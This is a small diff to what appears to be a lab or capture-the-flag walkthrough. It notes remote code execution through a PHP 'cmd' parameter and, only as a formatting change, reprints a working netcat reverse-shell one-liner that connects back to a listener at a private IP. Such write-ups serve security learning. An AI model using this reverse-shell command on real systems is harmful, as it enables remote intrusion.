@@ -82,9 +82,10 @@ if (isset($_GET['cmd'])) {
 - We have RCE
 
 - Set up listener
-- Run a bash rev shell command
+- Run a bash rev shell command:
+
 ```bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.102.74.132 8881 >/tmp/f
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.102.74.132 8881 >/tmp/f
 ```
 
 ![image8](../resources/b2b31ce3cc2b40caa7da056df56c1cc8.png)
